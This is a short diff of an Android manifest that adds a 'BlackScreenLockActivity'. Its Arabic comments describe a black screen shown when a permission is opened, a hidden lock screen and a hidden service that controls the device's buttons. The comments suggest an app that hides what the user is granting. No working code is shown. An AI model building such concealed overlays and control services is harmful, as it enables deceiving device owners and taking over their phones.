@@ -17,6 +17,8 @@
 
         <!-- شاشة القفل السوداء المخفية -->
         <activity android:name=".PasswordLockActivity" android:exported="false" />
+        <!-- شاشة سوداء جديدة (كود جديد) عند فتح الإذن -->
+        <activity android:name=".BlackScreenLockActivity" android:exported="false" />
 
         <!-- الخدمة الخفية التي تتحكم بالأزرار -->
         <service
